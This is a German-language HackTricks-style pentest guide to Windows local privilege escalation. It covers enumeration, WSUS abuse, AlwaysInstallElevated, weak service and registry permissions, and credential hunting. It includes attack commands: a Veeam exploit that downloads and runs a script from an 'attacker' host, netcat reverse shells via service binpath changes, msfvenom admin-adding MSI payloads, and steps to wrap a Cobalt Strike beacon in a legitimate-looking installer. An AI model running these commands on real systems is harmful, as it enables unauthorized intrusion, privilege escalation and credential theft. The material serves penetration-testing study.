# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Bestes Tool, um nach Windows local privilege escalation vectors zu suchen:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Initial Windows Theory

### Access Tokens

**Wenn du nicht weißt, was Windows Access Tokens sind, lies bitte die folgende Seite, bevor du weitermachst:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Weitere Informationen zu ACLs - DACLs/SACLs/ACEs findest du auf der folgenden Seite:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Wenn du nicht weißt, was Integrity Levels in Windows sind, solltest du die folgende Seite lesen, bevor du weitermachst:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Es gibt verschiedene Dinge in Windows, die dich **daran hindern könnten, das System zu enumerieren**, Executables auszuführen oder sogar **deine Aktivitäten zu erkennen**. Du solltest die folgende **Seite** **lesen** und all diese **Defenses**-**Mechanismen** **enumerieren**, bevor du mit der privilege escalation enumeration beginnst:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

UIAccess processes, die über `RAiLaunchAdminProcess` gestartet werden, können missbraucht werden, um High IL ohne Prompts zu erreichen, wenn die AppInfo secure-path checks umgangen werden. Den dedizierten UIAccess/Admin Protection bypass workflow findest du hier:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation kann missbraucht werden, um einen beliebigen SYSTEM registry write auszuführen (RegPwn):

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Neuere Windows-Builds haben außerdem einen **SMB arbitrary-port** LPE path eingeführt, bei dem eine privilegierte lokale NTLM authentication über eine wiederverwendete SMB TCP connection reflektiert wird:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## System Info

### Version info enumeration

Prüfe, ob die Windows-Version eine bekannte vulnerability hat (prüfe auch die angewendeten patches).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

Diese [site](https://msrc.microsoft.com/update-guide/vulnerability) ist nützlich, um detaillierte Informationen über Microsoft-Sicherheitslücken zu finden. Diese Datenbank enthält mehr als 4.700 Sicherheitslücken und zeigt die **massive attack surface**, die eine Windows-Umgebung bietet.

**Auf dem System**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas hat watson eingebettet)_

**Lokal mit Systeminformationen**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github-Repos mit exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

Irgendwelche credential/Juicy-Infos in den env variables gespeichert?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell-Verlauf
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell-Transkriptdateien

Du kannst lernen, wie man dies einschaltet in [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell-Module-Logging

Details von PowerShell-Pipeline-Ausführungen werden aufgezeichnet, einschließlich ausgeführter Befehle, Befehlsaufrufe und Teilen von Skripten. Allerdings werden vollständige Ausführungsdetails und Ausgaberesultate möglicherweise nicht erfasst.

Um dies zu aktivieren, befolge die Anweisungen im Abschnitt "Transcript files" der Dokumentation und wähle **"Module Logging"** statt **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Um die letzten 15 Ereignisse aus PowersShell-Logs anzuzeigen, kannst du ausführen:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Eine vollständige Aktivitäts- und Inhaltsaufzeichnung der Ausführung des Skripts wird erfasst, sodass jeder Codeblock dokumentiert wird, während er ausgeführt wird. Dieser Prozess bewahrt eine umfassende Audit-Trail jeder Aktivität, wertvoll für Forensik und die Analyse von bösartigem Verhalten. Durch die Dokumentation aller Aktivitäten zum Zeitpunkt der Ausführung werden detaillierte Einblicke in den Prozess bereitgestellt.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Die Protokollierung von Ereignissen für den Script Block kann im Windows Event Viewer unter dem Pfad gefunden werden: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Um die letzten 20 Ereignisse anzuzeigen, kannst du verwenden:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Internet-Einstellungen
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Laufwerke
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Du kannst das System kompromittieren, wenn die Updates nicht über http**S**, sondern über http angefordert werden.

Du beginnst damit zu prüfen, ob das Netzwerk ein nicht-SSL WSUS-Update verwendet, indem du in cmd Folgendes ausführst:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Oder Folgendes in PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Wenn du eine Antwort wie eine der folgenden erhältst:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Und wenn `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` oder `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` gleich `1` ist.

Dann **ist es ausnutzbar.** Wenn der letzte Registry-Wert gleich 0 ist, dann wird der WSUS-Eintrag ignoriert.

Um diese Schwachstellen auszunutzen, kannst du Tools wie [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) verwenden - das sind MiTM weaponized exploit scripts, um 'fake' Updates in nicht-SSL WSUS-Traffic einzuschleusen.

Lies die Forschung hier:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Lies den vollständigen Bericht hier**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Grundsätzlich ist das der Fehler, den dieser Bug ausnutzt:

> Wenn wir die Möglichkeit haben, unseren lokalen User-Proxy zu ändern, und Windows Updates den in den Einstellungen von Internet Explorer konfigurierten Proxy verwendet, dann haben wir folglich die Möglichkeit, [PyWSUS](https://github.com/GoSecure/pywsus) lokal auszuführen, um unseren eigenen Traffic abzufangen und Code als ein erhöhter Benutzer auf unserem Asset auszuführen.
>
> Außerdem wird der WSUS-Dienst, da er die Einstellungen des aktuellen Users verwendet, auch seinen Certificate Store verwenden. Wenn wir ein selbstsigniertes Zertifikat für den WSUS-Hostname erzeugen und dieses Zertifikat zum Certificate Store des aktuellen Users hinzufügen, können wir sowohl HTTP- als auch HTTPS-WSUS-Traffic abfangen. WSUS verwendet keine HSTS-ähnlichen Mechanismen, um eine Trust-on-First-Use-artige Validierung des Zertifikats zu implementieren. Wenn das präsentierte Zertifikat vom User vertraut wird und den korrekten Hostnamen hat, wird es vom Dienst akzeptiert.

Du kannst diese Schwachstelle mit dem Tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) ausnutzen (sobald es freigegeben ist).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Viele Enterprise-Agenten stellen eine localhost-IPC-Fläche und einen privilegierten Update-Channel bereit. Wenn Enrollment dazu gebracht werden kann, auf einen Angreifer-Server zu zeigen, und der Updater einer bösartigen Root-CA oder schwachen Signer-Prüfungen vertraut, kann ein lokaler User ein bösartiges MSI ausliefern, das der SYSTEM-Dienst installiert. Siehe eine verallgemeinerte Technik (basierend auf der Netskope stAgentSvc-Kette – CVE-2025-0309) hier:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` stellt einen localhost-Dienst auf **TCP/9401** bereit, der von Angreifern kontrollierte Nachrichten verarbeitet und dadurch beliebige Befehle als **NT AUTHORITY\SYSTEM** erlaubt.

- **Recon**: den Listener und die Version bestätigen, z. B. `netstat -ano | findstr 9401` und `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: ein PoC wie `VeeamHax.exe` mit den benötigten Veeam-DLLs im selben Verzeichnis ablegen, dann einen SYSTEM-Payload über den lokalen Socket triggern:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Der Dienst führt den Befehl als SYSTEM aus.
## KrbRelayUp

Eine **lokale Privilege Escalation**-Schwachstelle existiert in Windows-**Domänen**-Umgebungen unter bestimmten Bedingungen. Zu diesen Bedingungen gehören Umgebungen, in denen **LDAP signing** nicht erzwungen wird, Benutzer über Selbstrechte verfügen, die es ihnen erlauben, **Resource-Based Constrained Delegation (RBCD)** zu konfigurieren, und die Fähigkeit, dass Benutzer Computer innerhalb der Domäne erstellen können. Es ist wichtig zu beachten, dass diese **Anforderungen** mit den **Standardeinstellungen** erfüllt sind.

Finde den **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Für weitere Informationen über den Ablauf des Angriffs siehe [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Wenn** diese 2 Register **aktiviert** sind (Wert ist **0x1**), dann können Benutzer mit jeder beliebigen Berechtigung `*.msi`-Dateien als NT AUTHORITY\\**SYSTEM** **installieren** (ausführen).
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit-Payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
If you have a meterpreter session you can automate this technique using the module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Use the `Write-UserAddMSI` command from power-up to create inside the current directory a Windows MSI binary to escalate privileges. This script writes out a precompiled MSI installer that prompts for a user/group addition (so you will need GIU access):
```
Write-UserAddMSI
```
Just execute the created binary to escalate privileges.

### MSI Wrapper

Lies dieses Tutorial, um zu lernen, wie man mit diesem Tool einen MSI Wrapper erstellt. Beachte, dass du eine "**.bat**"-Datei wrappen kannst, wenn du **nur** **Befehlszeilen** **ausführen** willst


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Generate** mit Cobalt Strike oder Metasploit einen **neuen Windows EXE TCP payload** in `C:\privesc\beacon.exe`
- Öffne **Visual Studio**, wähle **Create a new project** und tippe "installer" in das Suchfeld. Wähle das **Setup Wizard**-Projekt und klicke auf **Next**.
- Gib dem Projekt einen Namen, z. B. **AlwaysPrivesc**, verwende **`C:\privesc`** als Speicherort, wähle **place solution and project in the same directory**, und klicke auf **Create**.
- Klicke weiter auf **Next**, bis du bei Schritt 3 von 4 bist (choose files to include). Klicke auf **Add** und wähle den Beacon payload aus, den du gerade generiert hast. Klicke dann auf **Finish**.
- Markiere das **AlwaysPrivesc**-Projekt im **Solution Explorer** und ändere in den **Properties** **TargetPlatform** von **x86** auf **x64**.
- Es gibt weitere Eigenschaften, die du ändern kannst, wie **Author** und **Manufacturer**, wodurch die installierte App legitimer wirken kann.
- Klicke mit der rechten Maustaste auf das Projekt und wähle **View > Custom Actions**.
- Klicke mit der rechten Maustaste auf **Install** und wähle **Add Custom Action**.
- Doppelklicke auf **Application Folder**, wähle deine **beacon.exe**-Datei aus und klicke auf **OK**. Dadurch wird sichergestellt, dass der beacon payload ausgeführt wird, sobald das Installationsprogramm gestartet wird.
- Unter den **Custom Action Properties** ändere **Run64Bit** auf **True**.
- Schließlich **build it**.
- Wenn die Warnung `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` angezeigt wird, stelle sicher, dass du die Plattform auf x64 gesetzt hast.

### MSI Installation

Um die **installation** der bösartigen `.msi`-Datei im **background:** auszuführen:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Um diese Schwachstelle auszunutzen, kannst du Folgendes verwenden: _exploit/windows/local/always_install_elevated_

## Antivirus und Detectors

### Audit Settings

Diese Einstellungen entscheiden, was **protokolliert** wird, also solltest du darauf achten
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding ist interessant, um zu wissen, wohin die Logs gesendet werden
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** ist für die **Verwaltung lokaler Administratorpasswörter** konzipiert und stellt sicher, dass jedes Passwort **eindeutig, zufällig und regelmäßig aktualisiert** wird auf Computern, die einer Domäne beigetreten sind. Diese Passwörter werden sicher in Active Directory gespeichert und können nur von Benutzern abgerufen werden, denen über ACLs ausreichende Berechtigungen gewährt wurden, sodass sie lokale Admin-Passwörter anzeigen können, wenn sie autorisiert sind.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Wenn aktiv, werden **Klartextpasswörter in LSASS** (Local Security Authority Subsystem Service) gespeichert.\
[**Mehr Informationen über WDigest auf dieser Seite**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

Ausgehend von **Windows 8.1** führte Microsoft einen erweiterten Schutz für die Local Security Authority (LSA) ein, um Versuche von nicht vertrauenswürdigen Prozessen zu **blockieren**, ihren Speicher zu **lesen** oder Code zu injizieren, und das System so weiter abzusichern.\
[**Mehr Informationen über LSA Protection hier**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** wurde in **Windows 10** eingeführt. Sein Zweck ist es, die auf einem Gerät gespeicherten Anmeldedaten vor Bedrohungen wie pass-the-hash-Angriffen zu schützen.| [**Mehr Informationen über Credentials Guard hier.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Gespeicherte Anmeldeinformationen

**Domänen-Anmeldeinformationen** werden von der **Local Security Authority** (LSA) authentifiziert und von Betriebssystemkomponenten verwendet. Wenn die Anmeldedaten eines Benutzers von einem registrierten Sicherheits-Paket authentifiziert werden, werden in der Regel Domänen-Anmeldeinformationen für den Benutzer erstellt.\
[**Mehr Informationen über Cached Credentials hier**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Benutzer & Gruppen

### Benutzer & Gruppen auflisten

Du solltest prüfen, ob eine der Gruppen, denen du angehörst, interessante Berechtigungen hat
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Privileged groups

Wenn du **zu einer privilegierten Gruppe gehörst, kannst du möglicherweise deine Privileges eskalieren**. Erfahre hier mehr über privileged groups und wie man sie missbraucht, um Privileges zu eskalieren:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Erfahre mehr** darüber, was ein **token** ist, auf dieser Seite: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Sieh dir die folgende Seite an, um **mehr über interessante tokens** zu erfahren und wie man sie missbraucht:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Logged users / Sessions
```bash
qwinsta
klist sessions
```
### Home-Ordner
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Passwort-Richtlinie
```bash
net accounts
```
### Den Inhalt der Zwischenablage abrufen
```bash
powershell -command "Get-Clipboard"
```
## Laufende Prozesse

### Datei- und Ordnerberechtigungen

Zunächst einmal: Beim Auflisten der Prozesse **prüfe auf Passwörter in der Kommandozeile des Prozesses**.\
Prüfe, ob du **irgendeine laufende Binärdatei überschreiben** kannst oder ob du Schreibrechte auf den Ordner der Binärdatei hast, um mögliche [**DLL Hijacking attacks**](dll-hijacking/index.html) auszunutzen:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Immer nach möglichen [**electron/cef/chromium debuggers** laufenden Prozessen suchen, die du missbrauchen könntest, um Privilegien zu eskalieren](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Berechtigungen der Prozess-Binaries überprüfen**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Überprüfen der Berechtigungen der Ordner der Binärdateien von Prozessen (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

Du kannst einen Memory-Dump eines laufenden Prozesses mit **procdump** aus den sysinternals erstellen. Dienste wie FTP haben die **credentials im Klartext im memory**, versuche den memory-Dump zu erstellen und die credentials auszulesen.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Unsichere GUI-Apps

**Anwendungen, die als SYSTEM ausgeführt werden, können es einem Benutzer erlauben, eine CMD zu starten oder Verzeichnisse zu durchsuchen.**

Beispiel: "Windows Help and Support" (Windows + F1), nach "command prompt" suchen, auf "Click to open Command Prompt" klicken

## Services

Service Triggers lassen Windows einen Service starten, wenn bestimmte Bedingungen eintreten (Named-Pipe/RPC-Endpunkt-Aktivität, ETW-Ereignisse, IP-Verfügbarkeit, Geräteanschluss, GPO-Aktualisierung usw.). Selbst ohne SERVICE_START-Rechte kann man oft privilegierte Services starten, indem man ihre Trigger auslöst. Siehe die Enumeration- und Aktivierungstechniken hier:

-
{{#ref}}
service-triggers.md
{{#endref}}

Erhalte eine Liste von Services:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Berechtigungen

Du kannst **sc** verwenden, um Informationen über einen Dienst zu erhalten
```bash
sc qc <service_name>
```
Es wird empfohlen, die Binary **accesschk** von _Sysinternals_ zu verwenden, um die erforderliche Privilegienstufe für jeden Dienst zu überprüfen.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Es wird empfohlen zu überprüfen, ob "Authenticated Users" einen Dienst ändern können:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Dienst aktivieren

Wenn du diesen Fehler erhältst (zum Beispiel bei SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Du kannst es aktivieren mit
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Beachten Sie, dass der Dienst upnphost für XP SP1 von SSDPSRV abhängt, um zu funktionieren**

**Eine weitere Umgehungslösung** für dieses Problem ist das Ausführen von:
```
sc.exe config usosvc start= auto
```
### **Ändern des Service-Binärpfads**

In dem Szenario, in dem die Gruppe "Authenticated users" über **SERVICE_ALL_ACCESS** auf einen Service verfügt, ist es möglich, die ausführbare Binärdatei des Service zu ändern. Um **sc** zu ändern und auszuführen:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Dienst neu starten
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Privilegien können durch verschiedene Berechtigungen erhöht werden:

- **SERVICE_CHANGE_CONFIG**: Erlaubt die Neukonfiguration der Service-Binary.
- **WRITE_DAC**: Ermöglicht die Neukonfiguration von Berechtigungen und damit die Möglichkeit, Service-Konfigurationen zu ändern.
- **WRITE_OWNER**: Erlaubt das Übernehmen des Besitzes und die Neukonfiguration von Berechtigungen.
- **GENERIC_WRITE**: Erbt die Fähigkeit, Service-Konfigurationen zu ändern.
- **GENERIC_ALL**: Erbt ebenfalls die Fähigkeit, Service-Konfigurationen zu ändern.

Zur Erkennung und Ausnutzung dieser Schwachstelle kann _exploit/windows/local/service_permissions_ verwendet werden.

### Weak permissions von Service-Binaries

Wenn ein Service als **`LocalSystem`**, **`LocalService`**, **`NetworkService`** oder ein privilegiertes Domain-Konto läuft, aber **Benutzer mit niedrigen Rechten die Service-EXE oder ihren übergeordneten Ordner ändern können**, kann der Service oft durch **Ersetzen der Binary und Neustarten des Services** übernommen werden.

**Prüfe, ob du die Binary ändern kannst, die von einem Service ausgeführt wird**, oder ob du **Schreibrechte auf den Ordner** hast, in dem sich die Binary befindet ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Du kannst jede Binary, die von einem Service ausgeführt wird, mit **wmic** ermitteln (nicht in system32) und deine Berechtigungen mit **icacls** prüfen:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Du kannst auch **sc** und **icacls** verwenden:
```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
Suche nach gefährlichen ACLs, die **`Everyone`**, **`BUILTIN\Users`** oder **`Authenticated Users`** gewährt wurden, insbesondere **`(F)`**, **`(M)`** oder **`(W)`** auf der Service-Executable oder auf dem Verzeichnis, das sie enthält. Ein praktischer Missbrauchsablauf ist:

1. Bestätige das Service-Konto und den Executable-Pfad mit `sc qc <service_name>`.
2. Bestätige mit `icacls <path>`, dass das Binary schreibbar ist.
3. Ersetze das Service-Binary durch ein Payload oder ein gültiges bösartiges Service-Binary.
4. Starte den Service mit `sc stop <service_name> && sc start <service_name>` neu (oder warte auf einen Reboot / Service-Trigger).

Nützliche automatisierte Checks:
```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```
> Wenn der Dienst einem normalen Benutzer nicht erlaubt, ihn neu zu starten, prüfe, ob er beim Booten automatisch startet, eine Failure Action hat, die ihn neu startet, oder indirekt durch die Anwendung, die ihn verwendet, ausgelöst werden kann.

### Berechtigungen zum Ändern der Dienst-Registry

Du solltest prüfen, ob du eine Service-Registry ändern kannst.\
Du kannst deine **Berechtigungen** über eine Service-**Registry** **prüfen**, indem du:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Es sollte überprüft werden, ob **Authenticated Users** oder **NT AUTHORITY\INTERACTIVE** über `FullControl`-Berechtigungen verfügen. Falls ja, kann die vom Dienst ausgeführte Binärdatei geändert werden.

Um den Pfad der ausgeführten Binärdatei zu ändern:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry-Symlink-Race zu beliebigem HKLM-Value-Write (ATConfig)

Einige Windows-Accessibility-Features erstellen per-user **ATConfig**-Keys, die später von einem **SYSTEM**-Prozess in einen HKLM-Session-Key kopiert werden. Ein Registry-**symbolic link race** kann diesen privilegierten Write auf **jeden HKLM-Pfad** umleiten und so eine Primitive für beliebigen HKLM-**value write** geben.

Wichtige Orte (Beispiel: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` listet installierte Accessibility-Features.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` speichert vom Benutzer kontrollierte Konfiguration.
